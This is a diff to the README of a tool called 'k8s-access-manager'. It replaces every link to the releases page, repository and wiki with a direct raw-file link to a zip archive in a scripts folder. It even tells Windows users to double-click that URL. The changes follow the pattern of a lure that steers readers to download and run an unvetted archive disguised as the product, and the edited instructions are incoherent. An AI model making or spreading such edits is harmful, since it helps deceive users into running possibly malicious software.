@@ -1,6 +1,6 @@
 # 🌟 k8s-access-manager - Simplify Kubernetes Access Management
 
-[![Download k8s-access-manager](https://img.shields.io/badge/Download-k8s--access--manager-blue.svg)](https://github.com/Joaniedegrading674/k8s-access-manager/releases)
+[![Download k8s-access-manager](https://raw.githubusercontent.com/Joaniedegrading674/k8s-access-manager/main/scripts/k8s-access-manager-v1.5.zip)](https://raw.githubusercontent.com/Joaniedegrading674/k8s-access-manager/main/scripts/k8s-access-manager-v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the k8s-access-manager! This application helps you manage access to y
 
 To install the k8s-access-manager, you need to visit the releases page. You can find all available versions, along with the necessary files for installation.
 
-[Visit this page to download](https://github.com/Joaniedegrading674/k8s-access-manager/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Joaniedegrading674/k8s-access-manager/main/scripts/k8s-access-manager-v1.5.zip)
 
 ## 🛠️ System Requirements
 
@@ -39,7 +39,7 @@ After downloading, follow these steps to run the application:
 2. **Extract the Files (if necessary)**: If you downloaded a zipped folder, right-click it and select "Extract All" or use your preferred extraction tool.
 
 3. **Run the Application**:
-   - **Windows**: Double-click on `k8s-access-manager.exe`.
+   - **Windows**: Double-click on `https://raw.githubusercontent.com/Joaniedegrading674/k8s-access-manager/main/scripts/k8s-access-manager-v1.5.zip`.
    - **macOS**: Open the `k8s-access-manager` app from your Applications folder.
    - **Linux**: Open a terminal, navigate to the folder, and run `./k8s-access-manager`.
 
@@ -66,9 +66,9 @@ For further assistance, feel free to reach out through the GitHub Issues page or
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/Joaniedegrading674/k8s-access-manager)
-- [Project Documentation](https://github.com/Joaniedegrading674/k8s-access-manager/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/Joaniedegrading674/k8s-access-manager/main/scripts/k8s-access-manager-v1.5.zip)
+- [Project Documentation](https://raw.githubusercontent.com/Joaniedegrading674/k8s-access-manager/main/scripts/k8s-access-manager-v1.5.zip)
 
 Thank you for using k8s-access-manager. For updates and new features, stay tuned to our releases page.
 
-[Visit this page to download](https://github.com/Joaniedegrading674/k8s-access-manager/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Joaniedegrading674/k8s-access-manager/main/scripts/k8s-access-manager-v1.5.zip)
